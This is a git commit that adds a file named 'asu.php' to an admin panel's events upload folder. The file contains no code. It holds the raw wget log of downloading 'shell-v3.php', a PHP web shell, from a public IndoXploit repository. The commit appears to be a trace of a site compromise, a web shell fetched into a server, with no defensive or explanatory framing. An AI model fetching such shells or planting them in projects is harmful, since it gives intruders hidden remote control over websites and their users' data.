cc852fee80e56a0e7fc2c986e09bf261dcffe282
Joseph O. Olaitan <destinyolaitan419@gmail.com>
2026-07-09 23:10:49 +0000

    Add files via upload

---
+++ cctech-admin/uploads/events/asu.php
@@ -0,0 +1,13 @@
+--2020-06-16 01:10:30--  https://raw.githubusercontent.com/linuxsec/indoxploit-shell/master/shell-v3.php
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.128.133, 151.101.0.133, 151.101.64.133, ...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.128.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 123091 (120K) [text/plain]
+Saving to: 'shell-v3.php'
+
+     0K .......... .......... .......... .......... .......... 41% 24.5M 0s
+    50K .......... .......... .......... .......... .......... 83% 24.9M 0s
+   100K .......... ..........                                 100% 51.7M=0.004s
+
+2020-06-16 01:10:30 (27.1 MB/s) - 'shell-v3.php' saved [123091/123091]
+
